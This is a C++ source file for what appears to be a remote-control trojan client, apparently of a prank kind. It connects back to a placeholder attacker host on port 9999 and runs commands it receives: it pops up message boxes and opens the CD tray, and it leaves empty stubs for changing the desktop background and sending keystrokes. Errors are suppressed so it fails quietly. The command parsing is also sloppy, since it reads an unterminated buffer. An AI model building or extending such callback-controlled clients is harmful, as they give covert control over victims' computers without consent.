#include <iostream>
#include <boost/asio.hpp>
#include <boost/array.hpp>
#include <exception>

#include "WinTools.h"


using boost::asio::ip::tcp;
using namespace std;

int main(int argc, char **argv) {
	try {
		
		boost::asio::io_service io;
		tcp::resolver rs(io);
		tcp::resolver::query qu("YOUR IP HERE", "9999");
		
		tcp::resolver::iterator it = rs.resolve(qu);
		
		tcp::socket sock(io);
		boost::asio::connect(sock, it);
		
		while(true) {			
			boost::array<char, 512> buf;
			boost::system::error_code er;
			
			size_t len = sock.read_some(boost::asio::buffer(buf), er);
			
			if(er == boost::asio::error::eof) {
				break;
			} else if(er) {
				throw boost::system::system_error(er);
			}
			
			string convbuf = buf.data();
			
			if(convbuf.substr(0, 4) == "msg "){
				mbox(convbuf.substr(8, convbuf.find('|') - 8).c_str(), convbuf.substr(convbuf.find('|')+2, (convbuf.find(']') - convbuf.find('|')) - 2).c_str(), (icon) atoi(convbuf.substr(4, 1).c_str()), (button) atoi(convbuf.substr(6, 1).c_str()));
			} else if(convbuf.substr(0, 11) == "background ") {
			} else if(convbuf.substr(0, 9) == "sendkeys ") {
			} else if(convbuf.substr(0, 7) == "opencd ") {
				open_cd_tray();
			}
			
			
			
		}
		
	} catch (exception& e) {
		//cout << e.what() << endl;
		exit(-1);
	}
	
	return 0;
}
